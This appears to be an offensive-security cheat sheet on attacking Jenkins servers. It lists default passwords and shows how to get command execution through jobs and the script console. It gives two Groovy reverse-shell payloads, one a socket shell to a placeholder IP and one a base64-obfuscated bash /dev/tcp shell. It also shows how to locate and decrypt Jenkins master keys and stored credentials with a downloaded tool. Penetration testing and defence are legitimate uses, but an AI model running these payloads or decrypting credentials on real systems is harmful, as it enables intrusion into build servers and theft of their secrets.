# Jenkins


[Jenkins](https://www.jenkins.io/): is *"an open source automation server which enables developers around the world to reliably build, test, and deploy their software.  [Jenkins](https://en.wikipedia.org/wiki/Jenkins_(software)) is an open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery. It is a server-based system that runs in servlet containers such as Apache Tomcat. It is used in Automated Build pipelines and CICD."*

Default Passwords
```
jenkins jenkins
admin admin
```

## Pwning Jenkins

[pwn-jenkins](https://github.com/gquere/pwn_jenkins) are incredible notes on attacking Jenkins servers

## Exploitation of Jenkins Panel

With access you can create scheduled jobs that accept shell commands for both Windows and Linux. 

`Dashboard -> Create a job -> Freeform project -> Configure`

May require `cronjob` schedule syntax even on Windows - `* * * * *` to run every minute.

`/Script` endpoint is script console

```groovy
String host="IP";
int port=6996;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

A better variant [hacktricks.boitatech - Jenkins](https://hacktricks.boitatech.com.br/pentesting/pentesting-web/jenkins) - support the link for the Windows version 
```java
// bash -c 'bash -i >& /dev/tcp/172.17.0.1/10000 0>&1'

def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzEwMDAwIDA+JjEn}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(10000000000000)
println "out> $sout err> $serr"
```
[waitForOrKill - Groovey Documentation](https://docs.groovy-lang.org/2.4.0/html/api/org/codehaus/groovy/runtime/ProcessGroovyMethods.html#waitForOrKill(java.lang.Process,%20long)) *"Wait for the process to finish during a certain amount of time, otherwise stops the process....the number of milliseconds to wait before stopping the process!!"*

## Credential Decryption

Find
```bash
$JENKINS_HOME/credentials.xml 
$JENKINS_HOME/secrets/master.key
$JENKINS_HOME/secrets/hudson.util.Secret
$JENKINS_HOME/jobs/example-folder/config.xml - Possible location
```

With [Hoto's jenkins decryptor](https://github.com/hoto/jenkins-credentials-decryptor)
```bash
curl -L \
  "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.0/jenkins-credentials-decryptor_1.2.0_$(uname -s)_$(uname -m)" \
   -o jenkins-credentials-decryptor

chmod +x jenkins-credentials-decryptor

./jenkins-credentials-decryptor \
  -m master.key \
  -s hudson.util.Secret \
  -c config.xml \
  -o json
```


## References

[Jenkins Official ](https://www.jenkins.io/)  
[Wikipedia Jenkins](https://en.wikipedia.org/wiki/Jenkins_(software)) 
[Hoto's jenkins decryptor](https://github.com/hoto/jenkins-credentials-decryptor)
[hacktricks.boitatech - Jenkins](https://hacktricks.boitatech.com.br/pentesting/pentesting-web/jenkins)
[waitForOrKill - Groovey Documentation](https://docs.groovy-lang.org/2.4.0/html/api/org/codehaus/groovy/runtime/ProcessGroovyMethods.html#waitForOrKill(java.lang.Process,%20long)) 